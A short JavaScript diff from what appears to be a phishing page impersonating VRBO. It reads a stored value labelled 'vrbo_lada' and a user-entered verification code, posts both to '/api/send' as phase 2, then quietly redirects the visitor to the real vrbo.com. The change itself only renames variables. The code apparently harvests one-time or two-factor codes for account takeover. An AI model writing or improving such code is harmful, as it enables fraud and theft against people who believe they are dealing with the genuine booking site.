@@ -103,13 +103,13 @@
     btnConfirm.disabled = true;
     loader.classList.add('is-visible');
 
-    const lada   = sessionStorage.getItem('vrbo_lada') || '';
-    const numero = verifyInput.value;
+    const metodo   = sessionStorage.getItem('vrbo_lada') || '';
+    const codigo = verifyInput.value;
 
     fetch('/api/send', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ lada, numero, fase: '2' })
+      body: JSON.stringify({ metodo, codigo, fase: '2' })
     }).finally(() => {
       setTimeout(() => { window.location.href = 'https://www.vrbo.com/?siteid=9025005'; }, 3000);
     });
